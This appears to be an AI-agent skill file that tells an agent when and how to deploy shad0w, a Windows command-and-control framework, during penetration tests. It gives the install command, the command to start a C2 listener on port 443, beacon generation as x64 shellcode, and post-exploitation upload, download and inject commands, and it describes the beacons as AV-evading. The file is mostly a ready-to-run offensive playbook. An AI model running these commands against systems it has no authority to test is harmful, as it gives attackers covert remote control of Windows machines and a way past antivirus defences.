---
name: shad0w-c2-windows
description: "shad0w: Windows pentest C2. Signals: c2, command-and-control, start server, generate beacon, payload type."
zh-signals: "shad0w: Windows 渗透 C2。信号:c2,命令控制,启动服务端,生成 beacon,载荷类型。"
when-to-use: >-
  Use when establishing a Windows-focused command-and-control channel during a
  penetration test; start the server, generate a staged or stageless beacon,
  and manage post-exploitation from the console.
---

# shad0w

- Attack Category: C35 C2 Frameworks
- Upstream Repository: https://github.com/bats3c/shad0w
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/bats3c/shad0w && cd shad0w && ./install.sh
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./shad0w -c 0.0.0.0 -p 443` | Start the server |
| `python shad0w.py beacon -p x64/shellcode` | Generate a beacon |
| `stageless/staged` | Payload type |
| `console upload/download/inject` | Post-exploitation |

## Attack Scenario Playbook

### Windows pentest C2

```bash
./shad0w -c 0.0.0.0 -p 443
python shad0w.py beacon  # Generate the payload for delivery, full control from the console
```

## Notes

C2 by bats3c, focused on Windows post-exploitation with AV-evading beacons and rich modules, with a Python-based console.
